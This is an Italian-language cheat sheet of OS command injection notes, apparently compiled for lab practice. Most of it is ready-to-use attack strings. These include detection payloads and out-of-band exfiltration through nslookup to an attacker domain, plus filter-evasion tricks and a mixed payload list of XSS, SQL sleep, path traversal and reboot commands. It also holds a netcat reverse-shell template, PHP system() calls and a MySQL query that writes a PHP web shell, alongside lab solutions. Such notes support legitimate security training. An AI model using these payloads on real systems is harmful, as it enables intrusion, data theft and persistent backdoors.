

```
## Command Injection Vulnerabilities:


Dopo aver identificato una vulnerabilità di command injection del sistema operativo, è utile eseguire alcuni comandi iniziali per ottenere informazioni sul sistema. Di seguito è riportato un riepilogo di alcuni comandi utili sulle piattaforme Linux e Windows.


Linux	Windows
whoami	whoami   -> Nome dell'utente corrente
uname -a	ver  -> Sistema operativo
ifconfig	ipconfig /all -> Configurazione di rete	
netstat -an	netstat -an -> Le connessioni di rete	
ps -ef	tasklist -> Processi in esecuzione	



- Rilevamento tramite ritardi temporali:
& ping -c 10 127.0.0.1 &

- Rilevamento reindirizzando l'output:
& whoami > /var/www/static/whoami.txt &

- Rilevamento blind command injection tramite out-of-band interaction:
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
> root.kgji2ohoyw.web-attacker.com





```






```
## Command Injection - General

> & ping -c 10 127.0.0.1 &
> & echo aiwefwlguh &
> `whoami`
> $(whoami)
> w"h"o"am"i
> w'h'oam'I'
> who$@ami
> WhOaMi4
> $(rev<<<'imaohw')

Tr converte tutti i maiuscoli in minuscoli:
> $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")



Possiamo sfruttare le variabili di environment per recuperare dei caratteri che sono bannati es. "/" 
> echo ${PATH}
> echo ${LS_COLORS:10:1} -> " ; " 
> echo ${PATH:0:1} -> " / " 
> $HOME 
> $PWD 
> ${LS_COLORS:10:1}${HOME}


#. Obfuscate payload bash command: 
https://github.com/Bashfuscator/Bashfuscator


# General Payload:
$(WhOamI) 
`WhoamI` 
<scrIpt>AlerT(1)</script> 
';select+slEep(5);-- 
`Reboot` 
$(rebOot) 
/etc/passwd 
../../../etc/passwd 
`rebOot` 
<img src/onerror=alErt(1)> 
%3cscript%3ealert(1)%3c/script%3e 
rebOot%0a${IFS}reboot 
rebOot||reboo 
iD||iD 
"$HoME 
$PwD 


#. Reverse Shell:
REVERSE_SHELL='rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f' 



```

```
## Command Injection - PHP
> ;phpinfo()
> ;system('id')
> ;system('ps aux')
> ;system(%27cat%20/etc/passwd%27)


## Command Injection - PHP web shell in MySQL:
MySQL Query: 
> select '<?php $output=shell_exec($_GET["cmd"]);echo
"<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1;

```


```
## Command Injection - Apprentice

#1. OS command injection, simple case:
Modify the `storeID` parameter, giving it the value `1|whoami`

```


```
## Command Injection - Practitioner

#2. Blind OS command injection with time delays:
> `email=x||ping+-c+10+127.0.0.1||`


#3. Blind OS command injection with output redirection:
> There is a writable folder at:
`/var/www/images/`
> email=||whoami>/var/www/images/output.txt||
> filename=output.txt
> GET /output.txt HTTP 1.1


#4. Lab: Blind OS command injection with out-of-band interaction
> email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||



#5. Lab: Blind OS command injection with out-of-band data exfiltration
> email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||



```


```
## Command Injection - Expert
```


```
## Command Injection - HackTheBox

```